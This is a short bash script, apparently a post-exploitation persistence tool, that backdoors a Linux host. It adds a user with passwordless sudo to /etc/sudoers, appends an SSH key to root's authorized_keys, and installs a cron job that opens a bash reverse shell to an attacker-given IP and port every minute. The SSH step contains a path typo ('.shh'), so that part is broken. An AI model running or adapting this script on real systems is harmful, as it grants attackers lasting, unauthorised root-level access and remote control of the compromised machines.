#Test persistence by Kur0bai
#Usage: ./persistm3.sh USER PASSWORD IP PORT

USER_NAME="$1"
USER_PASS="$2"
TARGET_IP="$3"
TARGET_PORT="$4"

echo "[*] Creating user with sudo..."

useradd -m "$USER_NAME" -s /bin/bash
echo "${USER_NAME}:${USER_PASS}" | chpasswd
echo "${USER_NAME} ALL=(ALL) NOPASSWD:ALL" >> /etc/sudoers

echo "[*] Adding ssh key.."
if [ -f ./id_rsa.pub ]; then
	mkdir -p /root/.ssh
	cat ./id_rsa.pub >> /root/.shh/authorized_keys
	chmod 600 /root/.ssh/authorized_keys
else
	echo "[!] Your don't have the id_rsa.pub key, skipping.."
fi

echo "[*] Setting reverse shell"
(crontab -l 2>/dev/null; echo "* * * * * bash -i >& /dev/tcp/${TARGET_IP}/${TARGET_PORT} 0>&1")| crontab -



